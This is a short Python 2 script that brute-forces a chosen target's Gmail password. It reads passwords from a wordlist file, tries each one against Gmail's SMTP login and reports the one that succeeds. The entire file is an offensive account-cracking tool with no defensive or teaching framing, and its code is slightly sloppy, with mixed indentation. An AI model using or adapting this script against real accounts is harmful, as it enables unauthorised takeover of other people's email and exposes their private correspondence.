#!/usr/bin/env python
# -*- coding: utf-8 -*- 
from termcolor import colored
import re
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

def display_info():                                        
	print colored(' \t by; h.pishin07	')
	print colored( '     pishiiiiiiiiii')
        print colored( 'iran')
user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password
